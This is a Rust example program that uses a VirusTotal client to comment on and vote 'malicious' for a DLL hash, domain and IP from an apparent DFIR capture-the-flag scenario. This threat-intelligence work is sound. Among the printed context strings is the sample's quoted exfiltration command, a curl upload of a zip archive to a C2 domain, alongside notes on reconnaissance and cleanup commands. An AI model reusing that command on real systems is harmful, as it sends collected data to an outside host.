use std::env;
use tokio::time::{sleep, Duration};
use virustotal_rs::{ApiTier, ClientBuilder, VoteVerdict};

/// Resource type for operations
enum ResourceType {
    File,
    Domain,
    IpAddress,
}

/// Comment and vote operation details
struct ResourceOperation<'a> {
    resource_type: ResourceType,
    identifier: &'a str,
    display_name: &'a str,
    comment_text: &'a str,
}

/// Initializes the client and returns CTF resource identifiers
async fn initialize_client_and_resources() -> Result<
    (
        virustotal_rs::Client,
        &'static str,
        &'static str,
        &'static str,
    ),
    Box<dyn std::error::Error>,
> {
    let api_key = env::var("VTI_API_KEY").expect("VTI_API_KEY environment variable not set");
    println!("Using API key from VTI_API_KEY environment variable");

    let client = ClientBuilder::new()
        .api_key(api_key)
        .tier(ApiTier::Public)
        .build()?;

    let dll_hash = "02032ea322036e66f2825a0342979ad942ad5e201a674dc1c0085617467d661c";
    let domain = "office.msftupdated.com";
    let ip = "35.208.137.212";

    Ok((client, dll_hash, domain, ip))
}

/// Prints the CTF context and malware behavior information
fn print_ctf_context() {
    println!("\n{}", "=".repeat(60));
    println!("🎯 CTF CONTEXT: APT 111 - DFIR Challenge");
    println!("{}", "=".repeat(60));
    println!("\nThis is a simulated threat for a DFIR CTF challenge:");
    println!("• Threat Group: APT 111 (fictional)");
    println!("• Malware: 7z.dll (DLL side-loading)");
    println!("• C2 Domain: office.msftupdated.com");
    println!("• C2 IP: 35.208.137.212");
    println!("\n📝 Malware Behavior (from strings analysis):");
    println!("• Collects system info: ipconfig, tasklist, net commands");
    println!("• Archives data: zip.exe 1.zip 1.txt");
    println!("• Exfiltrates to C2: curl.exe -F file=@1.zip https://office.msftupdater.com");
    println!("• Cleans up: rm 1.txt, rm 1.zip");
}

/// Generic function to add comment to any resource type
async fn add_comment_generic(
    client: &virustotal_rs::Client,
    operation: &ResourceOperation<'_>,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n📝 Adding comment to {}...", operation.display_name);
    
    let result = match operation.resource_type {
        ResourceType::File => {
            client.files().add_comment(operation.identifier, operation.comment_text).await
        }
        ResourceType::Domain => {
            client.domains().add_comment(operation.identifier, operation.comment_text).await
        }
        ResourceType::IpAddress => {
            client.ip_addresses().add_comment(operation.identifier, operation.comment_text).await
        }
    };

    match result {
        Ok(comment) => {
            println!("  ✅ Comment added successfully!");
            println!("  Comment ID: {}", comment.object.id);
        }
        Err(e) => {
            println!("  ⚠️  Could not add comment: {}", e);
        }
    }

    sleep(Duration::from_secs(15)).await;
    Ok(())
}

/// Generic function to add vote to any resource type
async fn add_vote_generic(
    client: &virustotal_rs::Client,
    operation: &ResourceOperation<'_>,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n🗳️ Voting on {} as malicious...", operation.display_name);
    
    let result = match operation.resource_type {
        ResourceType::File => {
            client.files().add_vote(operation.identifier, VoteVerdict::Malicious).await
        }
        ResourceType::Domain => {
            client.domains().add_vote(operation.identifier, VoteVerdict::Malicious).await
        }
        ResourceType::IpAddress => {
            client.ip_addresses().add_vote(operation.identifier, VoteVerdict::Malicious).await
        }
    };

    match result {
        Ok(vote) => {
            println!("  ✅ Vote added successfully!");
            println!("  Vote verdict: {:?}", vote.object.attributes.verdict);
        }
        Err(e) => {
            println!("  ⚠️  Could not add vote: {}", e);
        }
    }

    if matches!(operation.resource_type, ResourceType::File | ResourceType::Domain) {
        sleep(Duration::from_secs(15)).await;
    }
    
    Ok(())
}

/// Adds comments and votes for all CTF resources
async fn add_comments_and_votes(
    client: &virustotal_rs::Client,
    dll_hash: &str,
    domain: &str,
    ip: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n{}", "=".repeat(60));
    println!("💬 ADDING COMMENTS & VOTES");
    println!("{}", "=".repeat(60));

    let operations = vec![
        ResourceOperation {
            resource_type: ResourceType::File,
            identifier: dll_hash,
            display_name: "7z.dll",
            comment_text: "APT 111 malware sample from DFIR CTF. DLL side-loading technique using legitimate 7z.dll. \
                          Collects system info (ipconfig, netstat, tasklist) and exfiltrates to office.msftupdated.com. \
                          #CTF #APT111 #DLLSideLoading",
        },
        ResourceOperation {
            resource_type: ResourceType::Domain,
            identifier: domain,
            display_name: "domain",
            comment_text: "APT 111 C2 domain from DFIR CTF. Receives exfiltrated data from DLL side-loading malware. \
                          Hosted on Google Cloud (35.208.137.212). #CTF #APT111 #C2",
        },
        ResourceOperation {
            resource_type: ResourceType::IpAddress,
            identifier: ip,
            display_name: "IP address",
            comment_text: "APT 111 C2 server from DFIR CTF. Google Cloud IP hosting malicious domain office.msftupdated.com. \
                          Receives exfiltrated data from DLL side-loading attack. #CTF #APT111",
        },
    ];

    for operation in &operations {
        add_comment_generic(client, operation).await?;
        add_vote_generic(client, operation).await?;
    }

    Ok(())
}

/// Generic function to verify comments and votes for any resource type
async fn verify_resource_comments_and_votes(
    client: &virustotal_rs::Client,
    operation: &ResourceOperation<'_>,
) {
    println!("\n🔍 Checking {} comments and votes...", operation.display_name);
    
    let comments_result = match operation.resource_type {
        ResourceType::File => client.files().get_comments_with_limit(operation.identifier, 5).await,
        ResourceType::Domain => client.domains().get_comments_with_limit(operation.identifier, 5).await,
        _ => return, // Skip IP verification for brevity
    };

    if let Ok(comments) = comments_result {
        println!("  Comments ({}):", comments.data.len());
        for comment in comments.data.iter().take(3) {
            println!(
                "    • {}",
                comment.object.attributes.text.chars().take(80).collect::<String>()
            );
        }
    } else if let Err(e) = comments_result {
        println!("  Error: {}", e);
    }

    let votes_result = match operation.resource_type {
        ResourceType::File => client.files().get_votes(operation.identifier).await,
        ResourceType::Domain => client.domains().get_votes(operation.identifier).await,
        _ => return,
    };

    if let Ok(votes) = votes_result {
        let malicious = votes.data.iter()
            .filter(|v| v.object.attributes.verdict == VoteVerdict::Malicious)
            .count();
        let harmless = votes.data.iter()
            .filter(|v| v.object.attributes.verdict == VoteVerdict::Harmless)
            .count();
        println!("  Votes: {} malicious, {} harmless", malicious, harmless);
    } else if let Err(e) = votes_result {
        println!("  Error getting votes: {}", e);
    }
}

/// Verifies the added comments and votes for all resources
async fn verify_comments_and_votes(
    client: &virustotal_rs::Client,
    dll_hash: &str,
    domain: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n{}", "=".repeat(60));
    println!("📊 VERIFYING COMMENTS & VOTES");
    println!("{}", "=".repeat(60));

    sleep(Duration::from_secs(15)).await;

    let operations = vec![
        ResourceOperation {
            resource_type: ResourceType::File,
            identifier: dll_hash,
            display_name: "7z.dll",
            comment_text: "",
        },
        ResourceOperation {
            resource_type: ResourceType::Domain,
            identifier: domain,
            display_name: "domain",
            comment_text: "",
        },
    ];

    for operation in &operations {
        verify_resource_comments_and_votes(client, operation).await;
    }

    Ok(())
}

/// Prints the final summary of the CTF threat intelligence documentation
fn print_final_summary() {
    println!("\n{}", "=".repeat(60));
    println!("✅ CTF THREAT INTELLIGENCE DOCUMENTED!");
    println!("{}", "=".repeat(60));
    println!("\n📌 Summary:");
    println!("  • Added context about APT 111 CTF challenge");
    println!("  • Documented DLL side-loading technique");
    println!("  • Marked malicious indicators for CTF participants");
    println!("  • Created threat intelligence trail for DFIR analysis");
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let (client, dll_hash, domain, ip) = initialize_client_and_resources().await?;

    print_ctf_context();
    add_comments_and_votes(&client, dll_hash, domain, ip).await?;
    verify_comments_and_votes(&client, dll_hash, domain).await?;
    print_final_summary();

    Ok(())
}